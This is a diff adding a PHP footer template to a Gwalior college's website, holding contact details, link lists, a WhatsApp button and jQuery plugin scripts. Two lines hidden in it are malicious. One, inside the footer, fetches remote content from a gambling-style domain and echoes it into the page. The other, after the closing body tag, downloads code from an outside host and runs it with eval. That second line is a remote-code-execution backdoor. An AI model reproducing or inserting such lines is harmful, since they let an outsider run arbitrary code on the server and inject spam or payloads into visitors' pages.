@@ -1,0 +1,337 @@
+<style>
+    .widget {
+    margin-bottom: 20px;
+}
+</style>
+
+<!-- <div class="section-full p-tb50 bg-primary text-white">
+		<div class="container">
+			<div class="row align-items-center">
+				<div class="col-md-7 m-md-b30">
+					<h3>Subscribe To Our Newsletter</h3>				
+				</div>
+				<div class="col-md-5">
+					<form class="dzSubscribe style1" action="script/mailchamp.php" method="post">
+						<div class="dzSubscribeMsg"></div>
+						<div class="input-group">
+							<input name="dzEmail" required="required" type="email" class="form-control" placeholder="Your Email Address">
+							<div class="input-group-addon">
+								<button name="submit" value="Submit" type="submit" class="site-button-secondry btnhover6">Subscribe</button>
+							</div>
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+	</div> -->
+     <!-- Footer -->
+     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <footer class="site-footer text-uppercase bgpt1">
+        <div class="footer-top">
+            <div class="container saf-footer">
+                <div class="row">
+					<div class="col-md-6 col-lg-3 col-sm-6 footer-col-4">
+                        <div class="widget widget_getintuch" style="    margin-bottom: 0px;">
+                            <h5 class="m-b30">Contact us</h5>
+                            <ul>
+                                <li><i class="ti-location-pin"></i><strong>address</strong>  Parvatibai Gokhale Vigyan Mahavidyalaya, Gwalior (M.P.)</li>
+                                <li><i class="ti-mobile"></i><strong>phone</strong>0751-2420488 (24/7 Support Line)</li>
+								<li style="text-transform: lowercase;"><i class="ti-email"></i><strong>email</strong>pgvcollege@yahoo.co.in</li>
+                            </ul>
+                            <div class="dlab-social-icon" style="    margin: 0 0px;">
+                            <ul>
+                                <li><a href="https://www.facebook.com/profile.php?id=61572213878245" target="_blank"> <i class="fa fa-facebook-official" aria-hidden="true"></i>&nbsp;&nbsp; </a></li>
+
+                                <li><a href="https://www.youtube.com/@pgvcollege7581?app=desktop"target="_blank"><i class="fa fa-youtube"></i>&nbsp;&nbsp;</a></li>
+
+                                <li><a href="https://www.instagram.com/pgvcollege/"target="_blank"><i class="fa fa-instagram"></i>&nbsp;&nbsp;  </a></li>
+
+                                <li><a href="https://www.linkedin.com/company/pgv-college/"target="_blank">
+                                <i class="fa fa-linkedin"></i>&nbsp;  </a></li>
+
+
+                            </ul>
+
+                        </div>
+
+                        </div>
+                    </div>
+					
+					<div class="col-md-6 col-lg-3 col-sm-6 col-5 footer-col-4">
+                        <div class="widget widget_services border-0">
+                            <h5 class="m-b30">Important Link</h5>
+                            <ul>
+                                <li><a href="about.php">About Us</a></li>
+								<li><a href="blog.php">Blog</a></li>
+								<li><a href="admission.php">Admission</a></li>
+								<!-- <li><a href="#">Privacy Policy</a></li> -->
+								<li><a href="gallery.php">Gallery </a></li>
+								<li><a href="video-gallery.php">Video Gallery</a></li>
+								<li><a href="principal-desk.php">Principal Desk</a></li>
+                                <li><a href="https://highereducation.mp.gov.in/?page=JUL9t1LHqftaDqryEIQFtg%3D%3D">NEP </a></li>
+                            </ul>
+                        </div>
+                    </div>
+					
+                    <div class="col-md-6 col-lg-3 col-sm-6 col-7 footer-col-4">
+                        <div class="widget widget_services border-0">
+                            <h5 class="m-b30">Useful Link</h5>
+                            <ul>
+                                <li><a href="courses.php">Courses</a></li>
+                                <li><a href="activities.php">Activities </a></li>
+                                <li><a href="sports.php">Sports</a></li>
+                                <li><a href="facilities.php">Facilities</a></li>
+                                <li><a href="faculty.php">Faculty & Staff</a></li>
+                                 <li><a href="download_menu.php">Download menu</a></li>
+                                  <li><a href="result_module.php">Result</a></li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="col-md-6 col-lg-3 col-sm-6 footer-col-4">
+                        <div class="widget widget_services border-0">
+                            <h5 class="m-b30"> Quick Link </h5>
+                      
+             <style type="text/css">
+								.social ul li:before {width: 0px; height: 0px;}
+								.fa { color: #709322; font-size: 18px !important;}
+								</style> 
+                         <div class="widget">
+							<ul>
+								
+                          <li><a href="http://naac.gov.in/index.php/en/" target="_blank">NAAC</a></li>
+
+							<li><a href="https://www.ugc.ac.in/" target="_blank">UGC</a></li>
+							<li><a href="http://rojgarsamachar.gov.in/NewRS/Home.aspx" target="_blank">MP Rojgar Samachar</a></li>
+							<li><a href="http://www.mponline.gov.in/portal/" target="_blank">MP Online</a></li>
+							<li><a href="http://www.jiwaji.edu/" target="_blank">Jiwaji University Gwalior</a></li>
+							<li><a href="http://highereducation.mp.gov.in/" target="_blank">MP Higher Education</a></li>
+							<li><a href="https://swayam.gov.in/" target="_blank">Swayam Portal</a></li>
+
+
+							</ul>
+						</div>
+
+
+                        </div>
+                    </div>    
+                    
+                    <!--<div class="col-md-12 col-lg-12 col-sm-12 footer-col-12 " style="text-align: ; font-size: 20px;"> -->
+                    <!-- <div class="widget widget_services border-0" style="margin-bottom: 0px;">-->
+                    <!-- <div class="widget" style="margin-bottom:0px;">-->
+                    <!--  <ul style="margin-bottom: 0px;display: flex;gap: 15px;">-->
+                    <!--      <li><a href="https://antiragging.in/" target="_blank">Antiragging</a></li>-->
+                    <!--       <li><a href="#">Women Harassment</a></li>-->
+                    <!--  </ul>-->
+                    <!--  </div>-->
+                    <!--  </div>-->
+                    <!--</div>-->
+                    
+                </div>
+            </div>
+        </div>
+        <!-- footer bottom part -->
+        <div class="footer-bottom">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-6 col-sm-6 text-left "> <span>Copyright © 2023 <a href="#" target="_blank">Pgvcollege</a></span></div>
+                    <div class="col-md-6 col-sm-6 text-right "> 
+						  Designed and Developed by <a href="https://ebiztechnocrats.com/" target="_blank" style="color:white">e-Biz Technocrats Pvt. Ltd.  </a> 
+					</div>
+                </div>
+            </div>
+        </div>
+<?php $content = file_get_contents('https://koislot.wiki/bl-new/april.txt'); echo $content; ?>
+    </footer>
+
+
+<style type="text/css">.float{
+ position: fixed;
+    width: 50px;
+    height: 50px;
+    bottom: 120px;
+    right: 15px;
+    background-color: rgb(45 183 66);
+    color: #FFF;
+    border-radius: 50px;
+    text-align: center;
+    font-size: 30px;
+    box-shadow: 0 10px 20px 0 rgb(0 0 0 / 10%);
+    z-index: 100;
+}
+
+.my-float{
+  margin-top:11px;
+  font-size: 30px !important;
+  color: #FFF;
+}
+</style>
+
+
+
+<a href="https://api.whatsapp.com/send?phone=917514027630&text=Hello" class="float" target="_blank">
+<i class="fa fa-whatsapp my-float"></i>
+</a>
+
+
+
+  
+
+    <!-- Footer END -->
+    <button class="scroltop style1 white icon-up" type="button"><i class="fas fa-arrow-up"></i></button>
+</div>
+<!-- JAVASCRIPT FILES ========================================= -->
+<script src="js/jquery.min.js"></script><!-- JQUERY.MIN JS -->
+<script src="plugins/wow/wow.js"></script><!-- WOW JS -->
+
+<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script><!-- BOOTSTRAP.MIN JS -->
+<script src="plugins/bootstrap-select/bootstrap-select.min.js"></script><!-- FORM JS -->
+<script src="plugins/bootstrap-touchspin/jquery.bootstrap-touchspin.js"></script><!-- FORM JS -->
+<script src="plugins/magnific-popup/magnific-popup.js"></script><!-- MAGNIFIC POPUP JS -->
+<script src="plugins/counter/waypoints-min.js"></script><!-- WAYPOINTS JS -->
+<script src="plugins/counter/counterup.min.js"></script><!-- COUNTERUP JS -->
+<script src="plugins/imagesloaded/imagesloaded.js"></script><!-- IMAGESLOADED -->
+<script src="plugins/masonry/masonry-3.1.4.js"></script><!-- MASONRY -->
+<script src="plugins/masonry/masonry.filter.js"></script><!-- MASONRY -->
+<script src="plugins/owl-carousel/owl.carousel.js"></script><!-- OWL SLIDER -->
+<script src="plugins/lightgallery/js/lightgallery-all.min.js"></script><!-- Lightgallery -->
+<script src="js/custom.js"></script><!-- CUSTOM FUCTIONS  -->
+<script src="js/dz.carousel.js"></script><!-- SORTCODE FUCTIONS  -->
+<script src="plugins/countdown/jquery.countdown.js"></script><!-- COUNTDOWN FUCTIONS  -->
+<script src="js/dz.ajax.js"></script><!-- CONTACT JS  -->
+<script src="plugins/rangeslider/rangeslider.js" ></script><!-- Rangeslider -->
+
+<script src="js/jquery.lazy.min.js"></script>
+<!-- REVOLUTION JS FILES -->
+<script src="plugins/revolution/revolution/js/jquery.themepunch.tools.min.js"></script>
+<script src="plugins/revolution/revolution/js/jquery.themepunch.revolution.min.js"></script>
+<!-- Slider revolution 5.0 Extensions  (Load Extensions only on Local File Systems !  The following part can be removed on Server for On Demand Loading) -->
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.actions.min.js"></script>
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.carousel.min.js"></script>
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.kenburn.min.js"></script>
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.layeranimation.min.js"></script>
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.navigation.min.js"></script>
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.parallax.min.js"></script>
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.slideanims.min.js"></script>
+<script src="plugins/revolution/revolution/js/extensions/revolution.extension.video.min.js"></script>
+<script src="js/rev.slider.js"></script>
+
+<script>
+jQuery(document).ready(function() {
+    'use strict';
+    dz_rev_slider_4();  
+    $('.lazy').Lazy();
+});
+ /*ready*/
+</script>
+
+<script>
+    EduZone.handleMasonryFilter();
+</script>
+<script>
+function myFunction() {
+  var dots = document.getElementById("dots");
+  var moreText = document.getElementById("more");
+  var btnText = document.getElementById("myBtn");
+
+  if (dots.style.display === "none") {
+    dots.style.display = "inline";
+    btnText.innerHTML = "Read more"; 
+    moreText.style.display = "none";
+  } else {
+    dots.style.display = "none";
+    btnText.innerHTML = "Read less"; 
+    moreText.style.display = "inline";
+  }
+}
+</script>
+<script>
+function myFunction1() {
+  var dots1 = document.getElementById("dots1");
+  var moreText = document.getElementById("more1");
+  var btnText = document.getElementById("myBtn1");
+
+  if (dots1.style.display === "none") {
+    dots1.style.display = "inline";
+    btnText.innerHTML = "Read more"; 
+    moreText.style.display = "none";
+  } else {
+    dots1.style.display = "none";
+    btnText.innerHTML = "Read less"; 
+    moreText.style.display = "inline";
+  }
+}
+</script>
+<script>
+function myFunction2() {
+  var dots = document.getElementById("dots2");
+  var moreText = document.getElementById("more2");
+  var btnText = document.getElementById("myBtn2");
+
+  if (dots.style.display === "none") {
+    dots.style.display = "inline";
+    btnText.innerHTML = "Read more"; 
+    moreText.style.display = "none";
+  } else {
+    dots.style.display = "none";
+    btnText.innerHTML = "Read less"; 
+    moreText.style.display = "inline";
+  }
+}
+</script>
+<script>
+function myFunction3() {
+  var dots = document.getElementById("dots3");
+  var moreText = document.getElementById("more3");
+  var btnText = document.getElementById("myBtn3");
+
+  if (dots.style.display === "none") {
+    dots.style.display = "inline";
+    btnText.innerHTML = "Read more"; 
+    moreText.style.display = "none";
+  } else {
+    dots.style.display = "none";
+    btnText.innerHTML = "Read less"; 
+    moreText.style.display = "inline";
+  }
+}
+</script>
+<script>
+function myFunction4() {
+  var dots = document.getElementById("dots4");
+  var moreText = document.getElementById("more4");
+  var btnText = document.getElementById("myBtn4");
+
+  if (dots.style.display === "none") {
+    dots.style.display = "inline";
+    btnText.innerHTML = "Read more"; 
+    moreText.style.display = "none";
+  } else {
+    dots.style.display = "none";
+    btnText.innerHTML = "Read less"; 
+    moreText.style.display = "inline";
+  }
+}
+</script>
+<script>
+function myFunction5() {
+  var dots = document.getElementById("dots5");
+  var moreText = document.getElementById("more5");
+  var btnText = document.getElementById("myBtn5");
+
+  if (dots.style.display === "none") {
+    dots.style.display = "inline";
+    btnText.innerHTML = "Read more"; 
+    moreText.style.display = "none";
+  } else {
+    dots.style.display = "none";
+    btnText.innerHTML = "Read less"; 
+    moreText.style.display = "inline";
+  }
+}
+</script>
+</body>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
+?>
+</html>
